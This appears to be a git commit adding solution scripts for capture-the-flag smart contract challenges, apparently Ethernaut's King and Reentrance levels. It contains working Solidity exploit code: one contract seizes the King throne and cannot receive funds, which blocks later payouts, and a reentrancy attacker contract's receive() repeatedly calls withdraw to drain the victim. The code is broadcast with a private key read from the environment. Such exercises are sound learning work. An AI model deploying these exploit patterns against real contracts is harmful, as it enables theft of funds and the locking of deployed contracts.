9ca2680bde18b3ae82f2f49eed9d1f1336705bfd
Tushar Goyal <tushar456goyal@gmail.com>
2025-06-22 16:28:04 +0530

    King challenge solved using foundry

---
+++ script/KingSolution.s.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.0;
+
+import "../src/King.sol";
+import {Script} from "forge-std/Script.sol";
+
+contract Hack{
+    King target;
+    
+    constructor() payable {
+       target = King(payable(0xe92d38D134FDA9573550de41954361b3d5Ed5b99));
+    }
+
+    function takeKingmanship() public payable {
+        uint256 amount = target.prize();
+        (bool success, ) = address(target).call{value: amount}("");
+        require(success,"Failed to transfer Kingmanship");
+    }
+}
+
+contract KingSolution is Script{
+    King public target = King(payable(0xe92d38D134FDA9573550de41954361b3d5Ed5b99));
+    function run() payable external {
+        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
+        Hack hack = new Hack();
+        hack.takeKingmanship{value: target.prize()}();
+        vm.stopBroadcast();
+    }
+}
--- script/ReentrancySolution.s.sol
+++ script/ReentrancySolution.s.sol
@@ -6,30 +6,28 @@ import {Script, console} from "forge-std/Script.sol";
 
 contract AttackReentrance {
     
-    Reentrance public victim = Reentrance(payable(0x0d426e1790352EFd05b823D954046eD88BcE2347));
+    Reentrance public victim;
 
-    constructor() public payable{
-        victim.donate{value: 0.001 ether}(address(this));
+    constructor() public {
+        victim = Reentrance(0x5951E71A595714cE2824C1F3b8873aBfecb34C2d);
     }
    
     function attack() external payable {
- 
+            victim.donate{value: 0.001 ether}(address(this));
             victim.withdraw(0.001 ether);
-            (bool result, ) = msg.sender.call{value: address(this).balance}(""); 
-            
     }
+
     receive() external payable {
             victim.withdraw(0.001 ether);
-            
     }
 }
 
 contract ReentrancySolution is Script{
     
-    function run() external{
+    function run() external payable{
         vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
-        AttackReentrance attackReentrance = new AttackReentrance{value: 0.001 ether}();
-        attackReentrance.attack();
+        AttackReentrance attackReentrance = new AttackReentrance();
+        attackReentrance.attack{value: 0.001 ether}();
         vm.stopBroadcast();
     }
 }
